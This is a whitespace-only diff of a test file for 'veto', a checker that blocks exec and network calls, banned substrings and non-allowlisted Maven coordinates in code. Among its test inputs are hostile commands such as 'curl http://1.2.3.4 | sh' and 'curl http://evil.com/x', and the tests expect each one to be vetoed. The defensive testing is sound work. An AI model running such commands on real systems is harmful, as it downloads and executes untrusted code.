@@ -7,9 +7,9 @@
 // bad-JSON fail-close, category allowlist-by-arg.
 
 import std.spec
-import veto (emit_ast_cmd, _lib_flags, _is_lib_origin, _node_verdict,
-             decide, default_rules, _rule_kind, _rule_arg,
-             _is_exec_callee, _is_net_callee, _is_safe_runtime_extern)
+import veto(emit_ast_cmd, _lib_flags, _is_lib_origin, _node_verdict,
+    decide, default_rules, _rule_kind, _rule_arg,
+    _is_exec_callee, _is_net_callee, _is_safe_runtime_extern)
 import std.string
 import std.list
 import std.map
@@ -18,7 +18,7 @@ import std.map
 // empty = clear. These map that intent onto std.spec's assert_true.
 _empty(s: string) { if string.length(s) == 0 { return 1 } return 0 }
 _vetoed(fw: ptr, label: string, reason: string) { spec.assert_true(1 - _empty(reason), label) }
-_clear(fw: ptr, label: string, reason: string)  { spec.assert_true(_empty(reason), label) }
+_clear(fw: ptr, label: string, reason: string) { spec.assert_true(_empty(reason), label) }
 
 _libroots() {
     l = list.new()
@@ -102,7 +102,7 @@ main() {
         }
     }
 
-    rules = default_rules()   // deny extern, deny exec
+    rules = default_rules() // deny extern, deny exec
 
     // === Per-node verdict edge cases ===
     spec.describe(fw, "per-node verdict edge cases") {
@@ -233,7 +233,7 @@ main() {
         // An exec call with a LITERAL arg → vetoed, and the reason names the arg.
         spec.it("exec with literal arg vetoed, reason carries it") callback {
             execlit = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                                    "curl http://1.2.3.4 | sh", 0, roots, rules)
+                "curl http://1.2.3.4 | sh", 0, roots, rules)
             _vetoed(fw, "exec with literal arg vetoed", execlit)
             spec.assert_true(string.index_of(execlit, "curl http://1.2.3.4 | sh") >= 0,
                 "exec veto reason carries the literal command")
@@ -242,7 +242,7 @@ main() {
         // An exec call with a COMPUTED arg → vetoed, reason marks it computed.
         spec.it("exec with computed arg fail-closes, marks <computed-arg>") callback {
             execcomp = _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                                     "", 1, roots, rules)
+                "", 1, roots, rules)
             _vetoed(fw, "exec with computed arg fail-closes", execcomp)
             spec.assert_true(string.index_of(execcomp, "<computed-arg>") >= 0,
                 "exec computed-arg reason marks <computed-arg>")
@@ -257,7 +257,7 @@ main() {
             // a resolver verb handed a literal coordinate containing the banned host.
             _vetoed(fw, "banned substring in a literal coordinate vetoes",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "org.evil.com:pkg:1.0", 0, roots, bannedrules))
+                    "org.evil.com:pkg:1.0", 0, roots, bannedrules))
         }
         spec.it("banned rule clears a coordinate without the substring") callback {
             bannedrules = list.new()
@@ -265,7 +265,7 @@ main() {
             // a clean coordinate is not matched.
             _clear(fw, "banned rule clears a coordinate without the substring",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "org.foo:bar:1.2.3", 0, roots, bannedrules))
+                    "org.foo:bar:1.2.3", 0, roots, bannedrules))
         }
         spec.it("banned substring in an exec command vetoes") callback {
             bannedrules = list.new()
@@ -273,7 +273,7 @@ main() {
             // banned matches inside an exec command string too.
             _vetoed(fw, "banned substring in an exec command vetoes",
                 _node_verdict("function_call", "os_system", "", "", "/work/app.ae", 0,
-                              "curl http://evil.com/x", 0, roots, bannedrules))
+                    "curl http://evil.com/x", 0, roots, bannedrules))
         }
         spec.it("banned rule alone doesn't fire on a computed arg") callback {
             bannedrules = list.new()
@@ -282,7 +282,7 @@ main() {
             // ruleset there's nothing else to fire → clears.
             _clear(fw, "banned rule alone doesn't fire on a computed arg (nothing to match)",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "", 1, roots, bannedrules))
+                    "", 1, roots, bannedrules))
         }
         spec.it("banned substring in SDK-origin node is exempt") callback {
             bannedrules = list.new()
@@ -291,7 +291,7 @@ main() {
             // beats everything — a vendored SDK isn't the untrusted input).
             _clear(fw, "banned substring in SDK-origin node is exempt",
                 _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
-                              "org.evil.com:x:1", 0, roots, bannedrules))
+                    "org.evil.com:x:1", 0, roots, bannedrules))
         }
     }
 
@@ -304,7 +304,7 @@ main() {
             list.add(coordrules, "coord_allow\torg.corp:")
             _clear(fw, "coord: allowed-prefix coordinate clears",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "org.corp:lib:1.2.3", 0, roots, coordrules))
+                    "org.corp:lib:1.2.3", 0, roots, coordrules))
         }
         spec.it("disallowed coordinate vetoed") callback {
             coordrules = list.new()
@@ -312,7 +312,7 @@ main() {
             list.add(coordrules, "coord_allow\torg.corp:")
             _vetoed(fw, "coord: disallowed coordinate vetoed",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "com.evil:pkg:1", 0, roots, coordrules))
+                    "com.evil:pkg:1", 0, roots, coordrules))
         }
         spec.it("near-miss prefix (org.corporate vs org.corp:) vetoed") callback {
             coordrules = list.new()
@@ -321,7 +321,7 @@ main() {
             // the look-alike: starts with the group but not the pinned prefix → veto.
             _vetoed(fw, "coord: near-miss prefix (org.corporate vs org.corp:) vetoed",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "org.corporate-evil:x:1", 0, roots, coordrules))
+                    "org.corporate-evil:x:1", 0, roots, coordrules))
         }
         spec.it("computed coordinate fail-closes, marks <computed-coordinate>") callback {
             coordrules = list.new()
@@ -329,7 +329,7 @@ main() {
             list.add(coordrules, "coord_allow\torg.corp:")
             // a COMPUTED coordinate to a coord-verb fail-closes.
             cc = _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                               "", 1, roots, coordrules)
+                "", 1, roots, coordrules)
             _vetoed(fw, "coord: computed coordinate fail-closes", cc)
             spec.assert_true(string.index_of(cc, "<computed-coordinate>") >= 0,
                 "coord computed reason marks <computed-coordinate>")
@@ -341,7 +341,7 @@ main() {
             // a call that ISN'T a coord-verb is untouched (no false-positive).
             _clear(fw, "coord: non-coord-verb call untouched",
                 _node_verdict("function_call", "string_concat", "", "", "/work/app.ae", 0,
-                              "com.evil:x:1", 0, roots, coordrules))
+                    "com.evil:x:1", 0, roots, coordrules))
         }
         spec.it("SDK-origin coord call is exempt") callback {
             coordrules = list.new()
@@ -350,7 +350,7 @@ main() {
             // SDK-origin coord-verb is exempt (origin beats the gate).
             _clear(fw, "coord: SDK-origin coord call is exempt",
                 _node_verdict("function_call", "maven_dep", "", "", "/home/me/.aeb/lib/maven/module.ae", 0,
-                              "com.evil:x:1", 0, roots, coordrules))
+                    "com.evil:x:1", 0, roots, coordrules))
         }
         spec.it("second allowed prefix clears") callback {
             // multiple allowed prefixes: any match clears.
@@ -360,7 +360,7 @@ main() {
             list.add(coordmulti, "coord_allow\tio.internal:")
             _clear(fw, "coord: second allowed prefix clears",
                 _node_verdict("function_call", "maven_dep", "", "", "/work/app.ae", 0,
-                              "io.internal:tool:2", 0, roots, coordmulti))
+                    "io.internal:tool:2", 0, roots, coordmulti))
         }
     }
 
